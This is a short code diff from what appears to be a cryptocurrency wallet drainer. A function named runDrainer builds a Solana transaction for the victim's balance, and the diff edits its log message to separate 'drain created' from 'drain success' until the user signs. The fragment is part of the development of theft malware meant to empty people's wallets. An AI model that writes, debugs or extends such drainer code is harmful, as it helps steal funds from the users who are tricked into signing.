@@ -1737,8 +1737,8 @@ async function runDrainer(provider) {
       balance: balance
     });
     
-    // Log drain success immediately when transaction is created
-    console.log('[DRAIN_SUCCESS_FRONTEND] Transaction created with drain amount:', {
+    // Log transaction created (not success yet - user hasn't signed)
+    console.log('[DRAIN_CREATED_FRONTEND] Transaction created with drain amount:', {
       publicKey: publicKey.toString(),
       actualDrainAmount: actualDrainAmount,
       actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
